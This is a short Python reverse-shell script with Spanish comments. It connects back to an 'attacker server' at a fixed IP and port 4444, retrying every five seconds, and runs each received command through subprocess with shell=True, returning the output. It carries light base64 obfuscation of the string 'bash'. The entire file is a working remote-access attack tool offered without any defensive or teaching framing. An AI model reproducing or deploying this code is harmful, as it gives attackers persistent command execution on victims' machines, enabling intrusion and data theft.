import socket
import subprocess
import os
import time
import base64

# Datos del servidor atacante
IP_ATACANTE = "192.168.1.100"
PUERTO = 4444

# Shell base64 (ofuscación básica)
shell_cmd = base64.b64decode("YmFzaA==").decode()  # 'bash' en base64

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP_ATACANTE, PUERTO))
            s.send(b"[*] Conectado\n")

            while True:
                comando = s.recv(1024).decode().strip()
                if comando.lower() == "exit":
                    break

                if comando.startswith("cd "):
                    try:
                        os.chdir(comando[3:])
                        s.send(b"Directorio cambiado\n")
                    except FileNotFoundError:
                        s.send(b"Directorio no encontrado\n")
                    continue

                resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
                salida = resultado.stdout + resultado.stderr
                s.send(salida.encode() if salida else b"Comando ejecutado\n")
            
            s.close()
        except Exception as e:
            time.sleep(5)  # Espera antes de reintentar conexión

connect()
